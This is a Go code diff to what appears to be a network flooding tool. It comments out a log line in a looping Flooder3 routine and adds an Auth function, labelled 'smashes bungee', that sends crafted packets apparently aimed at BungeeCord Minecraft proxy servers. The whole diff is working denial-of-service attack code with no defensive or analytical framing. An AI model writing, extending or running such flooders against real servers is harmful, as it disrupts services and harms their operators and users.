@@ -2,8 +2,11 @@ package methods
 
 import (
 	"fmt"
+	"math/rand"
 	"net"
 	"reflect"
+	"strconv"
+	"time"
 )
 
 // makeBytes puts given data into []byte slice
@@ -74,7 +77,7 @@ func Flooder3(data *Data, out net.Conn) bool {
 		data.zero = makeBytes(0)
 	}
 
-	fmt.Println("sent")
+	//fmt.Println("sent")
 
 	for i := 0; i < data.Loop; i++ {
 		_, err := out.Write(data.bytes)
@@ -87,6 +90,26 @@ func Flooder3(data *Data, out net.Conn) bool {
 			out.Write(data.one)
 			out.Write(data.zero)
 		}
+	}
+
+	return false
+}
+
+// Auth smashes bungee
+func Auth(data *Data, out net.Conn) bool {
+	if data.bytes == nil {
+		data.bytes = makeBytes(15, 0, 47, 15, data.Address, 99, 223, 2)
+	}
+
+	fmt.Println("sent")
+
+	out.Write(data.bytes)
+	rand.NewSource(time.Now().UnixNano())
+
+	_, err := out.Write(makeBytes(strconv.Itoa(rand.Intn(400))))
+
+	if err != nil {
+		return true
 	}
 
 	return false
